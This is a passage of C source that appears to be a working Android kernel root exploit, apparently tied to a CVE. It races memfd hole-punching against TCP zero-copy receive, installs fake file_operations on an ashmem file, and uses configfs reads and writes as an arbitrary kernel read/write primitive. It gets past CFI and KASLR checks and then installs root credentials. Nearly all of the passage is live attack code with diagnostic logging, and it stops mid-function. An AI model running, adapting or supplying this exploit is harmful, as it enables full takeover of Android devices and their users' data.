    if (fallocate(state->fd, 0, 0, TCP_PUNCH_SHMEM_LEN) != 0) break;
    atomic_store(&state->phase, 1);
    if (fallocate(state->fd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
                  (off_t)state->page_size,
                  TCP_PUNCH_SHMEM_LEN - state->page_size) != 0) break;
    atomic_store(&state->phase, 0);
  }
  atomic_store(&state->phase, 0);
  return NULL;
}

void do_tcp_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 20;
    return;
  }
  int client_fd = -1;
  int server_fd = -1;
  if (!make_tcp_route_pair(&client_fd, &server_fd)) {
    cfi_last_step = 21;
    cfi_last_errno = errno;
    return;
  }
  size_t page_size = PAGE_SIZE;
  int punch_fd = (int)syscall(SYS_memfd_create, "tcp-route-punch",
                              MFD_CLOEXEC);
  if (punch_fd < 0 ||
      fallocate(punch_fd, 0, 0, TCP_PUNCH_SHMEM_LEN) != 0) {
    cfi_last_step = 22;
    goto out_fds;
  }
  unsigned char *map = mmap(NULL, TCP_PUNCH_SHMEM_LEN,
                            PROT_READ | PROT_WRITE, MAP_SHARED, punch_fd, 0);
  if (map == MAP_FAILED) {
    cfi_last_step = 23;
    goto out_punch_fd;
  }
  for (size_t off = 0; off < TCP_PUNCH_SHMEM_LEN; off += page_size) {
    map[off] = 0x55;
  }

  struct tcp_punch_state state = {
    .fd = punch_fd,
    .page_size = page_size,
  };
  atomic_init(&state.stop, 0);
  atomic_init(&state.phase, 0);
  pthread_t puncher;
  SYSCHK(pthread_create(&puncher, NULL, tcp_route_punch_thread, &state));

  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&consumer_inflight, 0);
  atomic_store(&pselect_ready_peer_fd, -1);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&main_route_delay_usec, 0);

  unsigned char sendbuf[64];
  memset(sendbuf, 0x33, sizeof(sendbuf));
  int route_ok = 0;
  for (int seq = 1; seq <= TCP_ROUTE_ATTEMPTS; seq++) {
    int calls_before = atomic_load(&consumer_calls);
    send(server_fd, sendbuf, sizeof(sendbuf), MSG_DONTWAIT);
    while (atomic_load(&state.phase)) sched_yield();
    for (int spin = 0; !atomic_load(&state.phase) && spin < 10000000;
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }

    unsigned char zc[0x40];
    memset(zc, 0, sizeof(zc));
    put64(zc, 0x18, (uintptr_t)(map + page_size));
    put32(zc, 0x20, sizeof(sendbuf));
    put64(zc, 0x28, text_addr(INIT_TASK));
    put64(zc, 0x30, fake_lock);
    if (seq >= TCP_ROUTE_ARM_SEQ) {
      atomic_store(&punch_consume_go, seq);
    }
    socklen_t zc_len = sizeof(zc);
    errno = 0;
    int zc_ret = getsockopt(client_fd, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE,
                            zc, &zc_len);
    int zc_errno = errno;
    if (seq >= TCP_ROUTE_ARM_SEQ) {
      for (int spin = 0; spin < TCP_POST_GETSOCKOPT_HOLD; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
      atomic_store(&punch_consume_go, 0);
    }
    int calls = atomic_load(&consumer_calls);
    if (calls > calls_before) {
      pr_info("tcp route seq=%d ret=%d errno=%d len=%u calls=%d\n",
              seq, zc_ret, zc_errno, (unsigned)zc_len, calls);
      if (try_cfi_stage()) {
        route_ok = 1;
        break;
      }
      if (cfi_dirty_seen) break;
    }
  }
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 1);
  atomic_store(&state.stop, 1);
  pthread_join(puncher, NULL);
  munmap(map, TCP_PUNCH_SHMEM_LEN);
  if (!route_ok && !cfi_last_step) cfi_last_step = 24;
  pr_info("tcp route done calls=%d success=%d step=%d errno=%d\n",
          atomic_load(&consumer_calls), atomic_load(&consumer_success),
          cfi_last_step, cfi_last_errno);

out_punch_fd:
  close(punch_fd);
out_fds:
  close(server_fd);
  close(client_fd);
}
#endif

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  int write_only_cfi = pselect_write_only_cfi_enabled();
  pr_info("cfi llseek repair slot=%016zx value=%016llx write_only=%d\n",
          slot, (unsigned long long)llseek, write_only_cfi);
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  pr_info("cfi llseek write ret=%zd errno=%d\n", wr, errno);
  if (getenv("PSELECT_STOP_AFTER_CFI_LLSEEK_WRITE")) {
    cfi_last_step = 40;
    return 0;
  }
  if (write_only_cfi) {
    return wr == (ssize_t)sizeof(llseek);
  }
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  pr_info("cfi llseek read ret=%zd value=%016llx errno=%d\n",
          rd, (unsigned long long)after, errno);
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

static int repair_fake_fops_read(int fd) {
  uint64_t read_fn = text_addr(CONFIGFS_READ_ITER);
  uintptr_t slot = fake_fops + FOPS_READ_OFF;
  pr_info("cfi read repair slot=%016zx value=%016llx\n",
          slot, (unsigned long long)read_fn);
  ssize_t wr = configfs_write_once(fd, slot, &read_fn, sizeof(read_fn));
  pr_info("cfi read repair write ret=%zd errno=%d\n", wr, errno);
  if (getenv("PSELECT_STOP_AFTER_CFI_READ_REPAIR")) {
    cfi_last_step = 44;
    return 0;
  }
  return wr == (ssize_t)sizeof(read_fn);
}

static int parse_runtime_control_fop_target(uintptr_t *target) {
  const char *value = getenv("OLD_FILETARGET_CONTROL_FOP_TARGET");
  if (!value || !*value) {
    errno = EINVAL;
    return 0;
  }
  char *end = NULL;
  errno = 0;
  unsigned long long parsed = strtoull(value, &end, 0);
  if (errno || end == value || *end || (parsed & 7ULL) ||
      !is_direct_ptr((uintptr_t)parsed)) {
    errno = EINVAL;
    return 0;
  }
  *target = (uintptr_t)parsed;
  return 1;
}

static int capture_runtime_original_fops(int fd, uintptr_t control_target,
                                         uintptr_t target_fop,
                                         uint64_t *original_fops) {
  uint64_t first = 0;
  uint64_t second = 0;
  if (control_target == target_fop) {
    pr_warning("cfi runtime stock f_op control aliases target=%016zx\n",
               target_fop);
    errno = EINVAL;
    return 0;
  }

  ssize_t first_ret = configfs_read_once(
      fd, control_target, &first, sizeof(first));
  int first_errno = errno;
  ssize_t second_ret = configfs_read_once(
      fd, control_target, &second, sizeof(second));
  int second_errno = errno;
  pr_info("cfi runtime stock f_op target=%016zx first=%zd/%016llx/%d "
          "readback=%zd/%016llx/%d\n",
          control_target, first_ret, (unsigned long long)first, first_errno,
          second_ret, (unsigned long long)second, second_errno);
  if (first_ret != (ssize_t)sizeof(first) ||
      second_ret != (ssize_t)sizeof(second) || first != second ||
      (first & 7ULL) || !kaslr_done || first < kaslr_base ||
      first >= DIRECT_MAP_BASE || first == fake_fops) {
    errno = first_ret != (ssize_t)sizeof(first) ? first_errno : second_errno;
    if (!errno) errno = EINVAL;
    return 0;
  }
  /* This is already the exact value needed for emergency restoration.  Keep
   * it even if the stronger callback check below rejects further use. */
  *original_fops = first;

  /* A stable canonical pointer alone could still be the wrong field.  Check
   * the runtime table's ioctl entry against the same CFI target already used
   * successfully by fake_fops for ASHMEM_SET_NAME. */
  uint64_t ioctl_entry = 0;
  ssize_t ioctl_ret = configfs_read_once(
      fd, (uintptr_t)first + FOPS_IOCTL_OFF, &ioctl_entry,
      sizeof(ioctl_entry));
  uint64_t expected_ioctl = text_addr(ASHMEM_IOCTL);
  pr_info("cfi runtime stock f_op ioctl ret=%zd value=%016llx want=%016llx "
          "errno=%d\n",
          ioctl_ret, (unsigned long long)ioctl_entry,
          (unsigned long long)expected_ioctl, errno);
  if (ioctl_ret != (ssize_t)sizeof(ioctl_entry) ||
      ioctl_entry != expected_ioctl) {
    if (!errno) errno = EINVAL;
    return 0;
  }
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data_ptr =
      SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  int write_only_cfi = pselect_write_only_cfi_enabled();
  if (write_only_cfi) {
    slide_bootid_before = slide_bootid_want;
    slide_bootid_after = slide_bootid_want;
    slide_bootid_restore_ret = (ssize_t)sizeof(slide_bootid_want);
    pr_info("slide restore boot_id skipped write_only=1 pid=%d want=%016llx\n",
            getpid(), (unsigned long long)slide_bootid_want);
    return 1;
  }
  if (write_only_cfi) {
    slide_bootid_before = 0;
  } else {
    configfs_read_once(fd, boot_id_data_ptr, &slide_bootid_before,
                       sizeof(slide_bootid_before));
  }
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data_ptr, &slide_bootid_want, sizeof(slide_bootid_want));
  if (write_only_cfi) {
    slide_bootid_after = slide_bootid_want;
  } else {
    configfs_read_once(fd, boot_id_data_ptr, &slide_bootid_after,
                       sizeof(slide_bootid_after));
  }
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx write_only=%d errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, write_only_cfi, errno);
  int boot_id_restored =
      slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
      slide_bootid_after == slide_bootid_want;

#ifdef SLIDE_RB_PARENT_TYPE_RESTORE
  uintptr_t parent_type = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset +
                          sizeof(uint64_t);
  uint64_t type_before = 0;
  uint64_t type_after = 0;
  uint64_t type_want = SLIDE_RB_PARENT_TYPE_RESTORE;
  configfs_read_once(fd, parent_type, &type_before, sizeof(type_before));
  ssize_t type_restore_ret =
      configfs_write_once(fd, parent_type, &type_want, sizeof(type_want));
  configfs_read_once(fd, parent_type, &type_after, sizeof(type_after));
  pr_info("slide restore rb parent type pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), type_restore_ret,
          (unsigned long long)type_before,
          (unsigned long long)type_want,
          (unsigned long long)type_after, errno);
  return boot_id_restored &&
         type_restore_ret == (ssize_t)sizeof(type_want) &&
         type_after == type_want;
#else
  return boot_id_restored;
#endif
}

int install_child_root(int fd) {
#if defined(ROOT_USE_CONFIGFS_RW) && ROOT_USE_CONFIGFS_RW
  pr_info("cfi installing root with configfs rw\n");
  if (getenv("ROOT_INSTALL_PIPE_PHYSRW_RUNTIME")) {
    pr_info("cfi preparing pipe physrw by env before root\n");
    if (!install_pipe_physrw(fd)) {
      pr_warning("cfi pipe physrw prepare failed by env\n");
      return 0;
    }
  }
  return install_android_root(fd);
#else
  return install_pipe_physrw(fd) && install_android_root(fd);
#endif
}

int try_cfi_stage(void) {
  if (getenv("PSELECT_TWO_STAGE2")) {
    /*
     * Reaching this function means the second rtmutex route has already
     * stored this attempt's canonical fake pointer at file+0x40.  Wake the
     * splice that was admitted while the original f_mode was intact; it
     * restores f_flags/f_mode while dispatching through the retained stage1
     * fake fops.
     */
    app_publish_two_stage2_ready();
    ssize_t splice_ret = -1;
    uintptr_t installed_fops = 0;
    uintptr_t target_fop = 0;
    uint64_t original_fops = 0;
    unsigned char target_region[32];
    uint64_t original_flags_mode = 0;
    uint64_t bootstrap_flags_mode = 0;
    if (!app_wait_two_stage_splice(&splice_ret) ||
        !app_get_two_stage_state(&installed_fops, &target_fop,
                                 &original_fops, target_region,
                                 &original_flags_mode,
                                 &bootstrap_flags_mode) ||
        splice_ret != (ssize_t)sizeof(uint64_t)) {
      pr_error("two-stage bootstrap failed splice_ret=%zd; retaining "
               "stage2 process until external reboot\n", splice_ret);
      fflush(NULL);
      for (;;) pause();
    }
    int fd = fcntl(448, F_DUPFD_CLOEXEC, 449);
    if (fd < 0) {
      pr_error("two-stage post-splice fd duplicate failed errno=%d\n", errno);
      for (;;) pause();
    }
    uint64_t mode_after = 0;
    ssize_t mode_read = configfs_read_once(
        fd, target_fop + 0x18, &mode_after, sizeof(mode_after));
    pr_info("two-stage mode bootstrap read ret=%zd value=%016llx "
            "want=%016llx original=%016llx errno=%d\n",
            mode_read, (unsigned long long)mode_after,
            (unsigned long long)bootstrap_flags_mode,
            (unsigned long long)original_flags_mode, errno);
    if (mode_read != (ssize_t)sizeof(mode_after) ||
        mode_after != bootstrap_flags_mode) {
      pr_error("two-stage mode bootstrap readback mismatch; retaining\n");
      for (;;) pause();
    }

    uint64_t proof = 0x3252474154455354ULL; /* STAGER2 */
    uintptr_t proof_target = fake_fops - FOPS_TABLE_OFF + SCRATCH_OFF;
    ssize_t proof_write = configfs_write_once(
        fd, proof_target, &proof, sizeof(proof));
    uint64_t proof_after = 0;
    ssize_t proof_read = configfs_read_once(
        fd, proof_target, &proof_after, sizeof(proof_after));
    pr_info("two-stage arbitrary-rw proof target=%016zx write=%zd read=%zd "
            "value=%016llx errno=%d\n",
            proof_target, proof_write, proof_read,
            (unsigned long long)proof_after, errno);
    if (proof_write != (ssize_t)sizeof(proof) ||
        proof_read != (ssize_t)sizeof(proof_after) ||
        proof_after != proof) {
      pr_error("two-stage arbitrary-rw proof failed; retaining\n");
      for (;;) pause();
    }

    uint64_t null_owner = 0;
    ssize_t owner = configfs_write_once(
        fd, installed_fops + FOPS_OWNER_OFF,
        &null_owner, sizeof(null_owner));
    pr_info("two-stage stage1 owner clear ret=%zd target=%016zx errno=%d\n",
            owner, installed_fops, errno);
    if (owner != (ssize_t)sizeof(null_owner)) {
      for (;;) pause();
    }

    if (!install_child_root(fd)) {
      pr_error("two-stage root install failed; retaining\n");
      for (;;) pause();
    }

    /*
     * Refresh the middle bytes immediately before the final write.  In
     * particular f_count differs from the stage1 snapshot because the stage1
     * holder and this stage2 process both retain descriptors.  A read syscall
     * and the following write syscall carry the same transient fget count.
     */
    ssize_t final_region_read = configfs_read_once(
        fd, target_fop, target_region, sizeof(target_region));
    uint64_t active_fops = 0;
    uint64_t active_flags_mode = 0;
    memcpy(&active_fops, target_region, sizeof(active_fops));
    memcpy(&active_flags_mode, target_region + 0x18,
           sizeof(active_flags_mode));
    pr_info("two-stage final region read=%zd fops=%016llx "
            "flags_mode=%016llx errno=%d\n",
            final_region_read, (unsigned long long)active_fops,
            (unsigned long long)active_flags_mode, errno);
    if (final_region_read != (ssize_t)sizeof(target_region) ||
        active_fops != installed_fops ||
        active_flags_mode != bootstrap_flags_mode) {
      pr_error("two-stage final region validation failed; retaining\n");
      for (;;) pause();
    }
    memcpy(target_region, &original_fops, sizeof(original_fops));
    memcpy(target_region + 0x18, &original_flags_mode,
           sizeof(original_flags_mode));
    ssize_t restore = configfs_write_once(
        fd, target_fop, target_region, sizeof(target_region));
    int restore_errno = errno;
    errno = 0;
    void *mmap_ret = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, fd, 0);
    int mmap_errno = errno;
    if (mmap_ret != MAP_FAILED) munmap(mmap_ret, PAGE_SIZE);
    pr_info("two-stage combined file restore ret=%zd errno=%d "
            "post-mmap=%p/%d (stock size0 wants EINVAL)\n",
            restore, restore_errno, mmap_ret, mmap_errno);
    if (restore != (ssize_t)sizeof(target_region) ||
        mmap_ret != MAP_FAILED || mmap_errno != EINVAL) {
      pr_error("two-stage combined restore proof failed; retaining\n");
      for (;;) pause();
    }
    close(fd);
    cfi_owner_ret = owner;
    cfi_restore_ret = restore;
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }

  int fd = -1;
  if (cfi_preopen_fd >= 0) {
    fd = cfi_preopen_fd;
  } else if (getenv("OLD_FILETARGET_PAYLOAD")) {
    /*
     * launch_old_filetarget retains the measured ashmem struct file at fd
     * 448.  Duplicate it so an unsuccessful CFI attempt can close its local
     * descriptor without discarding the launcher's reference; both fds share
     * the exact file->f_op field targeted by the rtmutex store.
     */
    fd = fcntl(448, F_DUPFD_CLOEXEC, 449);
    if (fd < 0) {
      pr_warning("cfi retained file-target fd duplicate failed errno=%d\n",
                 errno);
    } else {
      pr_info("cfi using retained file-target fd=448 duplicate=%d\n", fd);
    }
  } else {
    fd = open_ashmem_device();
  }
  cfi_preopen_fd = -1;
  int dirty = 0;
  int fake_fops_installed = 0;
  int can_read_back = 0;
  uint64_t original_fops = 0;
  int original_fops_valid = 0;
  int mmap_route_confirmed = 0;
  uintptr_t control_fop_target = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    return 0;
  }
  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  int write_only_cfi = pselect_write_only_cfi_enabled();
#if REQUIRE_RUNTIME_CONTROL_FOPS_RESTORE
  if (!parse_runtime_control_fop_target(&control_fop_target)) {
    pr_warning("cfi missing/invalid runtime control f_op target errno=%d\n",
               errno);
    cfi_last_step = 46;
    cfi_last_errno = errno;
    close(fd);
    return 0;
  }
#else
  original_fops = canon_addr(ASHMEM_FOPS);
  original_fops_valid = 1;
#endif
  if (getenv("PSELECT_FAKE_FOPS_NULL_MMAP_DIAG")) {
    /* The launcher deliberately leaves the target ashmem object at size 0.
     * Stock ashmem_mmap() rejects that state with EINVAL.  The diagnostic
     * fake table has mmap=NULL, which the VFS rejects earlier with ENODEV.
     * Run this before the configfs owner repair so that its result remains
     * independent of the candidate CONFIGFS_BIN_WRITE_ITER address. */
    errno = 0;
    int size_ret = ioctl(fd, ASHMEM_GET_SIZE, 0);
    int size_errno = errno;
    errno = 0;
    void *mmap_ret = MAP_FAILED;
    if (size_ret == 0) {
      mmap_ret = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, fd, 0);
    }
    int mmap_errno = errno;
    if (mmap_ret != MAP_FAILED) {
      munmap(mmap_ret, PAGE_SIZE);
    }
    int fake_route = size_ret == 0 && mmap_ret == MAP_FAILED &&
                     mmap_errno == ENODEV;
    pr_info("cfi mmap-route oracle fd=%d size_ret=%d size_errno=%d "
            "mmap_ret=%p mmap_errno=%d "
            "(original=-1/EINVAL fake=-1/ENODEV) accepted=%d\n",
            fd, size_ret, size_errno, mmap_ret, mmap_errno, fake_route);
    if (!fake_route) {
      cfi_last_step = 49;
      cfi_last_errno = mmap_errno ? mmap_errno :
                       (size_errno ? size_errno : EINVAL);
      close(fd);
      return 0;
    }
    pr_info("cfi mmap-route oracle accepted fake file_operations\n");
    mmap_route_confirmed = 1;
  }
  if (getenv("PSELECT_STAGE1_READ_DIAG") ||
      getenv("PSELECT_TWO_STAGE_SPLICE")) {
    /*
     * A stock ashmem file already carries FMODE_CAN_READ, so replacing only
     * f_op is sufficient to exercise the legacy configfs .read callback.
     * Keep this before every attempted write: it independently validates the
     * corrected stock configfs_read_file CFI target and the first-stage
     * arbitrary-read primitive.
     *
     * rb_erase may have left fake_fops.owner non-NULL.  This diagnostic has
     * no write primitive with which to clear it, so never close the target fd
     * or exit after a confirmed fake route.  An external reboot is the safe
     * cleanup boundary.
     */
    uint64_t first = 0;
    uint64_t second = 0;
    errno = 0;
    ssize_t first_ret = configfs_read_once(
        fd, control_fop_target, &first, sizeof(first));
    int first_errno = errno;
    errno = 0;
    ssize_t second_ret = configfs_read_once(
        fd, control_fop_target, &second, sizeof(second));
    int second_errno = errno;
    unsigned char target_region[32] = {0};
    unsigned char control_region[32] = {0};
    ssize_t target_region_ret = configfs_read_once(
        fd, misc_fops, target_region, sizeof(target_region));
    ssize_t control_region_ret = configfs_read_once(
        fd, control_fop_target, control_region, sizeof(control_region));
    uint64_t target_fops_value = 0;
    uint64_t control_fops_value = 0;
    uint64_t target_flags_mode = 0;
    uint64_t control_flags_mode = 0;
    memcpy(&target_fops_value, target_region, sizeof(target_fops_value));
    memcpy(&control_fops_value, control_region, sizeof(control_fops_value));
    memcpy(&target_flags_mode, target_region + 0x18,
           sizeof(target_flags_mode));
    memcpy(&control_flags_mode, control_region + 0x18,
           sizeof(control_flags_mode));
    uint64_t bootstrap_flags_mode =
        target_flags_mode | (0x40000ULL << 32); /* FMODE_CAN_WRITE */
    int accepted =
        mmap_route_confirmed &&
        first_ret == (ssize_t)sizeof(first) &&
        second_ret == (ssize_t)sizeof(second) &&
        first == second && !(first & 7ULL) &&
        kaslr_done && first >= kaslr_base && first < DIRECT_MAP_BASE &&
        target_region_ret == (ssize_t)sizeof(target_region) &&
        control_region_ret == (ssize_t)sizeof(control_region) &&
        target_fops_value == fake_fops &&
        control_fops_value == first &&
        target_flags_mode == control_flags_mode;
    pr_info("cfi stage1 read oracle target=%016zx "
            "first=%zd/%016llx/%d second=%zd/%016llx/%d accepted=%d\n",
            control_fop_target, first_ret, (unsigned long long)first,
            first_errno, second_ret, (unsigned long long)second,
            second_errno, accepted);
    pr_info("cfi stage1 region target=%zd fops=%016llx flags_mode=%016llx "
            "control=%zd fops=%016llx flags_mode=%016llx bootstrap=%016llx\n",
            target_region_ret, (unsigned long long)target_fops_value,
            (unsigned long long)target_flags_mode, control_region_ret,
            (unsigned long long)control_fops_value,
            (unsigned long long)control_flags_mode,
            (unsigned long long)bootstrap_flags_mode);
    if (accepted && getenv("PSELECT_TWO_STAGE_SPLICE")) {
      uint64_t dummy = 0;
      ssize_t prearm = configfs_write_once(
          fd, misc_fops + 0x18, &dummy, sizeof(dummy));
      int prearm_errno = errno;
      pr_info("cfi stage1 splice prearm target=%016zx ret=%zd errno=%d "
              "(EINVAL expected)\n",
              misc_fops + 0x18, prearm, prearm_errno);
      if (prearm == -1 && prearm_errno == EINVAL) {
        pid_t holder = fork();
        if (holder == 0) {
          prctl(PR_SET_PDEATHSIG, 0);
          prctl(PR_SET_NAME, "cve43499-s1hold", 0, 0, 0);
          setsid();
          int null_fd = open("/dev/null", O_RDWR | O_CLOEXEC);
          if (null_fd >= 0) {
            dup2(null_fd, STDIN_FILENO);
            dup2(null_fd, STDOUT_FILENO);
            dup2(null_fd, STDERR_FILENO);
            if (null_fd > STDERR_FILENO) close(null_fd);
          }
          for (;;) pause();
        }
        if (holder < 0) {
          pr_error("cfi stage1 holder fork failed errno=%d\n", errno);
          accepted = 0;
        } else {
          app_publish_two_stage1(fake_fops, misc_fops, control_fop_target,
                                 first, target_region, target_flags_mode,
                                 bootstrap_flags_mode);
          pr_success("cfi stage1 published for splice bootstrap holder=%d\n",
                     holder);
          /*
           * The detached single-thread holder inherited the reclaim sockets
           * and target descriptor.  This attempt may now exit without
           * releasing the payload page; fd448 in the launcher keeps struct
           * file non-final.
           */
          close(fd);
          return 0;
        }
      } else {
        accepted = 0;
      }
    }
    cfi_last_step = accepted ? 50 : 51;
    cfi_last_errno = accepted ? 0 :
        (second_errno ? second_errno :
         (first_errno ? first_errno : EINVAL));
    fflush(NULL);
    if (mmap_route_confirmed) {
      pr_info("cfi stage1 diagnostic retaining process and fds; "
              "external reboot required\n");
      sigset_t blocked;
      sigfillset(&blocked);
      pthread_sigmask(SIG_BLOCK, &blocked, NULL);
      for (;;) {
        pause();
      }
    }
    close(fd);
    return 0;
  }
#if defined(REPAIR_FAKE_FOPS_OWNER_BEFORE_CFI) && \
    REPAIR_FAKE_FOPS_OWNER_BEFORE_CFI
  /*
   * The rtmutex erase writes the replacement rb_node parent/color into
   * fake_fops+0, which aliases file_operations.owner.  Clear it before every
   * diagnostic/error path that may close fd; otherwise fops_put() can pass
   * the rb value to module_put().
   */
  uint64_t null_owner_pre = 0;
  ssize_t owner_pre = configfs_write_once(
      fd, fake_fops + FOPS_OWNER_OFF, &null_owner_pre,
      sizeof(null_owner_pre));
  int owner_pre_errno = errno;
  cfi_owner_ret = owner_pre;
  pr_info("cfi pre-repair fake_fops owner ret=%zd errno=%d\n",
          owner_pre, owner_pre_errno);
  if (owner_pre != (ssize_t)sizeof(null_owner_pre)) {
    pr_info("cfi owner exact-positive gate rejected route ret=%zd want=%zu\n",
            owner_pre, sizeof(null_owner_pre));
    cfi_last_step = 47;
    cfi_last_errno = owner_pre_errno;
    if (mmap_route_confirmed) {
      /* mmap already proved that fd dispatches through fake_fops.  The
       * rtmutex insertion can leave fake_fops.owner holding rb parent/color;
       * close()/process exit would then pass that value to module_put().
       * With no working configfs writer there is no safe in-process repair,
       * so retain every reference until an external adb reboot resets state. */
      pr_error("cfi mmap-route confirmed but fake owner repair failed; "
               "holding process and fds (do not kill; external reboot "
               "required)\n");
      fflush(NULL);
      sigset_t blocked;
      sigfillset(&blocked);
      pthread_sigmask(SIG_BLOCK, &blocked, NULL);
      for (;;) {
        pause();
      }
    }
    close(fd);
    return 0;
  }
  fake_fops_installed = 1;
#if REQUIRE_RUNTIME_CONTROL_FOPS_RESTORE
  /* Capture the exact stock pointer before touching any unrelated kernel
   * object.  The owner ret==8 result proves the fake write callback is live;
   * repair its read slot, then require two identical reads from the untouched
   * control file and validate the table's ioctl entry. */
  if (!repair_fake_fops_read(fd)) {
    cfi_last_step = 45;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;
  if (!capture_runtime_original_fops(
          fd, control_fop_target, misc_fops, &original_fops)) {
    original_fops_valid = original_fops != 0;
    pr_warning("cfi runtime stock f_op capture failed errno=%d\n", errno);
    cfi_last_step = 48;
    cfi_last_errno = errno;
    goto fail;
  }
  original_fops_valid = 1;
#endif
#endif
  if (getenv("PSELECT_FAKE_FOPS_NULL_IOCTL_DIAG")) {
    errno = 0;
    int size_ret = ioctl(fd, ASHMEM_GET_SIZE, 0);
    int size_errno = errno;
    pr_info("cfi fops-route oracle fd=%d get_size_ret=%d errno=%d "
            "(original=0, fake=-1/ENOTTY)\n",
            fd, size_ret, size_errno);
    cfi_last_step = 39;
    cfi_last_errno = size_errno;
    goto fail;
  }
#if defined(FOPS_OWNERLESS_TREE_WRITE) && FOPS_OWNERLESS_TREE_WRITE
  uint64_t null_owner_tree = 0;
  ssize_t owner_tree = configfs_write_once(
      fd, fake_fops + FOPS_OWNER_OFF, &null_owner_tree,
      sizeof(null_owner_tree));
  uint64_t read_tree = text_addr(CONFIGFS_READ_ITER);
  ssize_t read_tree_ret = configfs_write_once(
      fd, fake_fops + FOPS_READ_OFF, &read_tree, sizeof(read_tree));
  pr_info("cfi treewrite repair fake_fops owner=%zd read=%zd errno=%d\n",
          owner_tree, read_tree_ret, errno);
#endif
#if defined(PSELECT_PRE_REPAIR_LLSEEK) && PSELECT_PRE_REPAIR_LLSEEK
  int pre_llseek_ok = repair_fake_fops_llseek(fd);
  pr_info("cfi pre-repair fake_fops llseek ok=%d errno=%d\n",
          pre_llseek_ok, errno);
#endif

  pr_info("cfi pre-read fd=%d misc_fops=%016zx fake_fops=%016zx write_only=%d\n",
          fd, misc_fops, fake_fops, write_only_cfi);
  if (getenv("PSELECT_STOP_BEFORE_CFI_READ")) {
    pr_info("cfi stop before misc_fops read by env\n");
    cfi_last_step = 37;
    goto fail;
  }
  uint64_t pre_fops = 0;
  ssize_t pre_rb = 0;
  if (!REQUIRE_RUNTIME_CONTROL_FOPS_RESTORE &&
      (write_only_cfi || getenv("PSELECT_SKIP_CFI_PRE_READ"))) {
    pre_fops = fake_fops;
    pre_rb = (ssize_t)sizeof(pre_fops);
    pr_info("cfi pre-read skipped; assuming fake_fops installed\n");
  } else {
    pre_rb = configfs_read_once(fd, misc_fops, &pre_fops, sizeof(pre_fops));
    pr_info("cfi post-read ret=%zd value=%016llx errno=%d\n",
            pre_rb, (unsigned long long)pre_fops, errno);
    if (getenv("PSELECT_STOP_AFTER_CFI_READ")) {
      pr_info("cfi stop after misc_fops read by env\n");
      cfi_last_step = 38;
      goto fail;
    }
  }
  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
    pr_warning("cfi misc_fops mismatch ret=%zd target=%016zx "
               "read=%016llx want=%016zx errno=%d\n",
               pre_rb, misc_fops, (unsigned long long)pre_fops,
               fake_fops, errno);
    if (!REQUIRE_RUNTIME_CONTROL_FOPS_RESTORE &&
        pre_rb == (ssize_t)sizeof(pre_fops) && is_direct_ptr(pre_fops)) {
      ssize_t wr = configfs_write_once(
          fd, misc_fops, &fake_fops, sizeof(fake_fops));
      uint64_t reread = 0;
      ssize_t rr = 0;
      if (write_only_cfi) {
        reread = fake_fops;
        rr = (ssize_t)sizeof(reread);
      } else {
        rr = configfs_read_once(fd, misc_fops, &reread, sizeof(reread));
      }
      pr_info("cfi refreshed stale misc_fops wr=%zd rr=%zd read=%016llx errno=%d\n",
              wr, rr, (unsigned long long)reread, errno);
      if (wr == (ssize_t)sizeof(fake_fops) &&
          rr == (ssize_t)sizeof(reread) && reread == fake_fops) {
        pre_fops = reread;
      }
    }
    if (pre_fops != fake_fops) {
      fops_before = pre_fops;
      cfi_last_step = 4;
      cfi_last_errno = errno;
      goto fail;
    }
  }

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (getenv("PSELECT_MM_OWNER_DIAG_AFTER_CFI_WRITE") &&
      is_direct_ptr(fops_leaked_mm)) {
    const char *offsets_env = getenv("ROOT_MM_OWNER_OFFSETS_RUNTIME");
    uintptr_t offsets[16];
    size_t offset_count = 0;
    if (offsets_env && *offsets_env) {
      const char *p = offsets_env;
      while (*p && offset_count < (sizeof(offsets) / sizeof(offsets[0]))) {
        while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' ||
               *p == ':') {
          p++;
        }
        if (!*p) {
          break;
        }
        char *end = NULL;
        errno = 0;
        unsigned long parsed = strtoul(p, &end, 0);
